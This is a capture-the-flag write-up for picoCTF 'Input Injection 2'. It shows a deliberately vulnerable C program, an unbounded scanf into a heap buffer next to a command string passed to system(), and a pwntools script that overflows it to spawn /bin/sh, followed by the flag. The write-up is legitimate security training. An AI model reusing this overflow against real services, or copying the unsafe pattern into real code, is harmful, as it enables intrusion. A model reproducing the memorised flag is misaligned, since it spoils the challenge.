# Input Injection 2

<img width="500" height="500" alt="image" src="https://github.com/user-attachments/assets/d32a86b3-0e2c-44d9-a40c-cc79fa27a618" />

**Tag:** `Binary Exploitation` `browser_webshell_solvable`

**Description:** 
> This program greets you and then runs a command. But can you take control of what command it executes? Connect to the program with netcat: nc saffron-estate.picoctf.net 63959. You can Download the program file here. And source code

**Attachments:** `vuln` `vuln.c`

**Hints:**

<details>
<summary>Hint 1</summary>

Notice how username and shell are both heap-allocated.

</details>

<details>
<summary>Hint 2</summary>
  
Offsets often hide in the memory addresses you see at runtime.

</details>

<details>
<summary>Hint 2</summary>
  
Try to overwrite what command gets executed.

</details>

**Author:** Yahaya Meddy

**Solved:** `640 users solved`

---

# Solution

given 2 files. one is elf and the other is source code. this is the content of the source code file

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(void) {
	char* username = malloc(28);
	char* shell = malloc(28);
	
	printf("username at %p\n", username);
    fflush(stdout);
	printf("shell at %p\n", shell);
    fflush(stdout);
	
	strcpy(shell, "/bin/pwd");
	
	printf("Enter username: ");
    fflush(stdout);
	scanf("%s", username);
	
	printf("Hello, %s. Your shell is %s.\n", username, shell);
	system(shell);
    fflush(stdout);
	
	return 0;
}
```

and here is the security of the elf file

```bash
 zsh > checksec --file=vulnn
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   68 Symbols        No    0      1vulnn
```

So my strategy for exploiting this challenge is very simple. The second hint states that the memory address offset is often hidden in the runtime that we see. And when running nc from the challenge

```bash
 zsh >  nc saffron-estate.picoctf.net 63959
username at 0x1dde82a0
shell at 0x1dde82d0
Enter username: admin
/home/ctf-player
Hello, admin. Your shell is /bin/pwd.
```

Well, since we have a leak address between the username and the shell, we just need to reduce the distance between them to get the offset. So this is how my exploitation script looks like

```python
from pwn import remote
import re

HOST = "saffron-estate.picoctf.net"
PORT = 64934

p = remote(HOST, PORT)
data = p.recvuntil(b"Enter username: ")
# print(data.decode(errors="ignore"))

user_addr = int(re.search(rb"username at (0x[0-9a-fA-F]+)", data).group(1), 16)
shell_addr = int(re.search(rb"shell at (0x[0-9a-fA-F]+)", data).group(1), 16)

print(hex(user_addr))
print(hex(shell_addr))

offset = shell_addr - user_addr
print(hex(offset))

payload = b"A" * offset + b"/bin/sh\x00"
p.sendline(payload)
p.interactive()
```

A brief explanation. So, in the script, I created a regex to read the leaks leaked by NC. Next, when the leak is successfully read, we will subtract the user_addr from the shell_addr. And when we get the offset, we will send payload A as much as the offset and also send the shell to NC.

Once everything is ready, let's run and get the flag.

<img width="500" height="216" alt="image" src="https://github.com/user-attachments/assets/db5866f9-e735-4028-ad94-3dd87805203d" />

and yes we managed to get the shell. lets list the directory

<img width="162" height="94" alt="image" src="https://github.com/user-attachments/assets/87a5afac-ba3b-413a-b734-e2d09abd50ff" />

yeah got it. lets goo

<img width="476" height="128" alt="image" src="https://github.com/user-attachments/assets/0fda35f3-9a79-4c20-b080-523762ac624a" />

---

# FLAG: picoCTF{us3rn4m3_2_sh3ll_48b038ff}
